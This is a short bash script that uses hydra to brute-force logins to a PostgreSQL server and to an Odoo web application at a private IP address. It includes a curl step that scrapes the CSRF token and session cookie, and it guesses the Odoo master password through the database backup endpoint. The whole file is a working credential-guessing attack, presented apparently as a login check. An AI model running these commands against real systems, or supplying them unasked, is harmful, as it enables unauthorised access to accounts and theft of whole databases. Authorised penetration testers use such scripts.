#/bin/bash

# Check Odoo web login (user/admin) and Postgres login

# Colors
  txtbld=$(tput bold)
  txtrst=$(tput sgr0)

# Variables
host="192.168.0.2"
port="8069"
url="http://$host:$port/web"
db_name="database_name"
pg_port="5432"
login_list="users_list.txt"
passwd_list="pw_list.txt"

# Use hydra -S and https-post-form for SSL
verb="-4" #-vV

# Try postgres (faster, not token)
echo "${txtbld}## POSTGRES ##${txtrst}"
hydra -I "${verb}" -F -s "${pg_port}" -L "${login_list}" -P "${passwd_list}" "${host}" postgres              # Template 1
hydra -I "${verb}" -f -s "${pg_port}" -L "${login_list}" -p "${db_name}"     "${host}" postgres "${db_name}" # Db_name with db_name as password
hydra -I "${verb}" -f -s "${pg_port}" -L "${login_list}" -P "${passwd_list}" "${host}" postgres "${db_name}" # Db_name
echo

# Try Odoo admin interface (no username)
echo "${txtbld}## ODOO ADMIN ##${txtrst}"
token=$(curl -sLc /tmp/odoo_ad.cookie "${url}"?db="$db_name" | grep 'name="csrf_token"' | sed -e 's/^[ \t]*//' | cut -d '"' -f6)
session_id=$(grep session_id /tmp/odoo_ad.cookie | awk '{print $7}')
hydra -I "${verb}" -f -s "${port}" -l '' -P "${passwd_list}" "${host}" http-post-form \
"/web/database/backup:master_pwd=^PASS^&name=initdb&backup_format=zip:F=denied:H=Cookie: session_id=${session_id}"
echo

# Try Odoo user interface (same session)
echo "${txtbld}## ODOO USER ##${txtrst}"
hydra -I "${verb}" -f -s "${port}" -L "${login_list}" -P "${passwd_list}" "${host}" http-post-form \
"/web/login:csrf_token=$token&db=$db_name&login=^USER^&password=^PASS^&redirect=:S=window.location:H=Cookie: session_id=${session_id}"

exit
